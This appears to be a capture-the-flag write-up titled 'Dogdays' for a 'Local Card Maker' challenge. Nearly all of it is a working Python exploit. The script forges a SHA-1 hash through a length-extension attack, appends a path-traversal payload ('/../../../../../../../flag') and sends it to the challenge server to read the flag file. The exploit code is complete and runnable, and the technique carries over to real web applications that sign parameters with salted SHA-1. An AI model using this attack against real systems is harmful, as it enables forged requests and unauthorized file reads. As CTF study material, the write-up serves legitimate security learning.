# Dogdays

**Sha-1-exploitation**

https://log.kv.io/post/2011/03/04/exploiting-sha-1-signed-messages

https://lewin.co.il/2022/04/17/thcon-2k22-ctf-local-card-maker-writeup.html

```
import struct
import base64
import urllib.parse
import requests

# The code below is based on https://github.com/nicolasff/pysha1 (adapted to Python3) until line 87:

top = 0xFFFFFFFF


def rotl(i, n):
    lmask = top << (32 - n)
    rmask = top >> n
    l = i & lmask
    r = i & rmask
    newl = r << n
    newr = l >> (32 - n)
    return newl + newr


def add(l):
    ret = 0
    for e in l:
        ret = (ret + e) & top
    return ret


xrange = range


def sha1_impl(msg, h0, h1, h2, h3, h4):
    for j in xrange(int(len(msg) / 64)):
        chunk = msg[j * 64 : (j + 1) * 64]

        w = {}
        for i in xrange(16):
            word = chunk[i * 4 : (i + 1) * 4]
            (w[i],) = struct.unpack(">i", word)

        for i in range(16, 80):
            w[i] = rotl((w[i - 3] ^ w[i - 8] ^ w[i - 14] ^ w[i - 16]) & top, 1)

        a = h0
        b = h1
        c = h2
        d = h3
        e = h4

        for i in range(0, 80):
            if 0 <= i <= 19:
                f = (b & c) | ((~b) & d)
                k = 0x5A827999
            elif 20 <= i <= 39:
                f = b ^ c ^ d
                k = 0x6ED9EBA1
            elif 40 <= i <= 59:
                f = (b & c) | (b & d) | (c & d)
                k = 0x8F1BBCDC
            elif 60 <= i <= 79:
                f = b ^ c ^ d
                k = 0xCA62C1D6

            temp = add([rotl(a, 5), f, e, k, w[i]])
            e = d
            d = c
            c = rotl(b, 30)
            b = a
            a = temp

        h0 = add([h0, a])
        h1 = add([h1, b])
        h2 = add([h2, c])
        h3 = add([h3, d])
        h4 = add([h4, e])

    return (h0, h1, h2, h3, h4)


def pad(msg, sz=None):
    if sz == None:
        sz = len(msg)
    bits = sz * 8
    padding = 512 - ((bits + 8) % 512) - 64

    msg += b"\x80"  # append bit "1", and a few zeros.
    return (
        msg + int(padding / 8) * b"\x00" + struct.pack(">q", bits)
    )  # don't count the \x80 here, hence the -8.


def sha1(msg):
    # These are the constants in a standard SHA-1
    return sha1_impl(
        pad(msg), 0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476, 0xC3D2E1F0
    )


# "Local Card Maker"-specific implementation starts here:


def sha1_bytes_to_str(result):
    # return "".join([hex(x)[2:].zfill(2) for x in result])
    return "".join([hex(x)[2:].zfill(8) for x in result])


def get_h_values(hash_string):
    # Divide hash_string to 5 ints, 4 bytes each
    return [int(hash_string[i * 8 : (i + 1) * 8], 16) for i in range(5)]


# "view_profile" taken from site ("page" query parameter)
block_1_buf = b"1.png"
# Hash taken from site ("pHash" query parameter)
# block_1_hash = b"06dadc9db741e1c2a91f266203f01b9224b5facf"
block_1_hash = b"06dadc9db741e1c2a91f266203f01b9224b5facf"
block_1_h_values = get_h_values(block_1_hash)
# taken from description of challenge
# salt_len = 12

# "aaa" is padding, since the previous SHA-1 block contains the length at the end which is parsed by PHP as Base64 data.
# I align to 4 bytes in order for the appended path to be parsed correctly.
block_2_buf = b"/../../../../../../../flag".replace(b"\n", b"")
# Pad this second block, use a custom size with additional 64 bytes to account for the first block (which is always padded to 64)
block_2_buf_padded = pad(block_2_buf, len(block_2_buf) + 64)
print(sha1_impl(block_2_buf_padded, *block_1_h_values))
joined_buf_hash = sha1_bytes_to_str(sha1_impl(block_2_buf_padded, *block_1_h_values))
print(joined_buf_hash)
# Add 23 "A"s to simulate the SHA-1 sblock creation with the salt, but remove the salt since it'll be added by the server.
for salt_len in range(12, 13):
    joined_buf = pad((b"A" * salt_len) + block_1_buf)[salt_len:] + block_2_buf

    # print(block_2_buf)
    # print(joined_buf)
    encoded_joined_buf = urllib.parse.quote_plus(joined_buf)
    # print(encoded_joined_buf)

    res = requests.get(
        "http://chal.competitivecyber.club:7777/view.php?pic=%s&hash=%s"
        % (encoded_joined_buf, joined_buf_hash)
    ).content
    if "Invalid".encode() not in res:
        print("length:" + str(salt_len))
        print(block_2_buf)
        print(joined_buf)
        print(encoded_joined_buf)
        print(res)
```

![image-20240930231624407](https://api.2h0ng.wiki:443/noteimages/2024/09/30/23-16-24-b944951a21ce0849061d2939ec5d331c.png)